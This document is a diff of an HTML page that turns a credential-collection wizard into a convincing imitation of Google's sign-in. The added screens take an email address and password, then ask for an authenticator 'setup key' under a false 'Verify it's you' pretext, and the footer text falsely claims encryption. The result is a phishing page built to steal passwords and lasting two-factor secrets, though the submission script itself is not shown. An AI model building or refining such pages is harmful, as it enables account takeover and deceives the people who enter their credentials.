@@ -3,69 +3,124 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Secure credential setup</title>
-<link rel="stylesheet" href="/style.css" />
+<title>Sign in - Google Accounts</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23EA4335' d='M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z'/%3E%3Cpath fill='%234285F4' d='M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z'/%3E%3Cpath fill='%23FBBC05' d='M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z'/%3E%3Cpath fill='%2334A853' d='M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z'/%3E%3C/svg%3E" />
+<link rel="stylesheet" href="/wizard.css" />
 </head>
-<body class="wizard-body">
-<div class="wizard-wrap">
-  <div class="wizard-card">
-    <div class="logo">g<span>session</span></div>
+<body>
 
-    <!-- progress -->
-    <div id="steps" class="steps">
-      <div class="step" data-step="0"><span>1</span>Username</div>
-      <div class="step" data-step="1"><span>2</span>Password</div>
-      <div class="step" data-step="2"><span>3</span>2FA</div>
-      <div class="step" data-step="3"><span>✓</span>Done</div>
+<div class="g-card" id="card">
+
+  <!-- ================= EMAIL SCREEN ================= -->
+  <div class="g-screen" id="screen-email">
+    <div class="g-logo" aria-hidden="true">
+      <svg viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
     </div>
 
-    <!-- panes -->
-    <div id="pane-intro" class="pane">
-      <h2 id="intro-title">Secure sign-in setup</h2>
-      <p class="muted" id="intro-sub">You've been invited to securely provide your login so it can be used on your behalf. It only takes a moment.</p>
-      <button class="primary wide" id="start-btn">Start</button>
-    </div>
+    <h1 class="g-title">Sign in</h1>
+    <p class="g-subtitle">Use your Google Account</p>
 
-    <form id="pane-username" class="pane hidden">
-      <h2>Step 1 — Your username</h2>
-      <p class="muted">Enter the email or username for this account.</p>
-      <input id="w-username" placeholder="you@example.com" autocomplete="off" required />
-      <button class="primary wide" type="submit">Continue</button>
-    </form>
+    <form id="form-email" novalidate>
+      <div class="g-field">
+        <input id="g-email" name="identifier" type="text" autocomplete="username" placeholder=" " spellcheck="false" />
+        <label for="g-email">Email or phone</label>
+      </div>
+      <div class="g-hint" id="email-hint" hidden></div>
 
-    <form id="pane-password" class="pane hidden">
-      <h2>Step 2 — Your password</h2>
-      <p class="muted">Your password is encrypted the moment it's received.</p>
-      <input id="w-password" type="password" placeholder="Password" autocomplete="off" required />
-      <label class="show-row"><input type="checkbox" id="w-show" /> <span>Show password</span></label>
-      <button class="primary wide" type="submit">Continue</button>
-    </form>
-
-    <form id="pane-totp" class="pane hidden">
-      <h2>Step 3 — Two-factor (optional)</h2>
-      <p class="muted">If your account uses an authenticator app, paste its setup key (Base32 secret) so codes can be generated automatically. If you're not sure, just skip.</p>
-      <input id="w-totp" placeholder="Authenticator secret (optional)" autocomplete="off" />
-      <div class="row-btns">
-        <button class="ghost" type="button" id="skip-totp">Skip</button>
-        <button class="primary" type="submit">Finish</button>
+      <div class="g-footer">
+        <button type="button" class="g-link" id="forgot-email">Forgot email?</button>
+        <button type="submit" class="g-btn" id="btn-email"><span class="b-label">Next</span><span class="spin" aria-hidden="true"></span></button>
       </div>
     </form>
-
-    <div id="pane-done" class="pane hidden">
-      <div class="done-check">✓</div>
-      <h2>All set</h2>
-      <p class="muted">Your credentials were submitted securely. You can close this page.</p>
-    </div>
-
-    <div id="pane-error" class="pane hidden">
-      <h2>Link unavailable</h2>
-      <p class="muted" id="error-msg">This link is invalid or has expired.</p>
-    </div>
-
-    <div id="w-error" class="err"></div>
   </div>
-  <p class="wizard-foot muted">🔒 Credentials are encrypted at rest. Only share this page with the person who sent it to you.</p>
+
+  <!-- ================= PASSWORD SCREEN ================= -->
+  <div class="g-screen hidden" id="screen-pass">
+    <div class="g-logo" aria-hidden="true">
+      <svg viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
+    </div>
+
+    <h1 class="g-title app" id="pass-title">Welcome</h1>
+    <div class="g-account" id="account-row" hidden>
+      <div class="initials" id="avatar-initials"></div>
+      <div class="who">
+        <div id="account-email"></div>
+        <div class="email" id="to-continue">To continue to your Google Account</div>
+      </div>
+    </div>
+
+    <form id="form-pass" novalidate>
+      <div class="g-field">
+        <input id="g-pass" name="Passwd" type="password" autocomplete="current-password" placeholder=" " spellcheck="false" />
+        <label for="g-pass">Enter your password</label>
+      </div>
+
+      <div class="g-hint" id="pass-hint" hidden></div>
+
+      <label class="g-show">
+        <input type="checkbox" id="show-pass" />
+        <span>Show password</span>
+      </label>
+
+      <div class="g-footer">
+        <button type="button" class="g-link" id="forgot-pass">Forgot password?</button>
+        <button type="submit" class="g-btn" id="btn-pass"><span class="b-label">Next</span><span class="spin" aria-hidden="true"></span></button>
+      </div>
+    </form>
+  </div>
+
+  <!-- ================= VERIFY / 2FA SCREEN ================= -->
+  <div class="g-screen hidden" id="screen-totp">
+    <div class="g-logo" aria-hidden="true">
+      <svg viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
+    </div>
+
+    <h1 class="g-title">Verify it's you</h1>
+    <p class="g-caption">To help keep your account safe, Google wants to make sure it's really you. Enter the 6-digit setup key from your authenticator app to finish.</p>
+
+    <div id="form-totp">
+    <div class="g-code">
+      <input id="g-totp" type="text" inputmode="text" autocomplete="one-time-code" placeholder="Setup key" spellcheck="false" />
+    </div>
+    <div class="g-hint" id="totp-hint" hidden></div>
+
+    <div class="g-footer">
+      <button type="button" class="g-link" id="try-another">Try another way</button>
+      <button type="submit" class="g-btn" id="btn-totp"><span class="b-label">Verify</span><span class="spin" aria-hidden="true"></span></button>
+    </div>
+    </div>
+  </div>
+
+  <!-- ================= DONE ================= -->
+  <div class="g-screen hidden" id="screen-done">
+    <div class="g-center">
+      <div class="g-done-icon">
+        <svg width="64" height="64" viewBox="0 0 64 64"><circle cx="32" cy="32" r="32" fill="#34A853"/><path d="M27 44l-9-9 3-3 6 6 16-16 3 3z" fill="#fff"/></svg>
+      </div>
+      <h1 class="g-title app">You're all set</h1>
+      <div class="g-done-text">
+        <p>Signed in securely. This page can be closed.</p>
+      </div>
+    </div>
+  </div>
+
 </div>
+
+<div class="g-toast" id="toast" aria-live="polite"></div>
+
+<footer class="g-footerbar">
+  <div class="g-foot-left">
+    <button type="button" class="g-foot-link" data-hint="Learn more about Google's terms, policies and privacy — your details are encrypted and only used to sign you in.">Help</button>
+    <button type="button" class="g-foot-link" data-hint="Your credentials are encrypted at rest and only used to sign you in.">Privacy</button>
+    <button type="button" class="g-foot-link" data-hint="Terms of service for this sign-in.">Terms</button>
+  </div>
+  <div class="g-foot-lang" id="g-lang">
+    <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
+    <span>English (United States)</span>
+    <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M7 10l5 5 5-5z"/></svg>
+  </div>
+</footer>
+
 <script src="/wizard.js"></script>
 </body>
 </html>
